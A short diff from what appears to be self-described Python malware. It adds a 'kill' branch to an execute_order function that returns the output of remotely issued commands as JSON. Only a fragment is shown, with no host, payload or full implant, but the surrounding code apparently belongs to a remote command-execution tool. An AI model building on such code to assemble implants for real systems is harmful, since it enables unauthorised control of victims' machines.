@@ -65,6 +65,10 @@ def execute_order(order, additional_data_received = ""):
 
     return json.dumps({additional_data_received:result_command.decode("ISO-8859-1")})
 
+  elif order == str(1):
+    print("KILL OF THE MALWARE !")
+    sys.exit(0)
+
   else:
     return ""
 
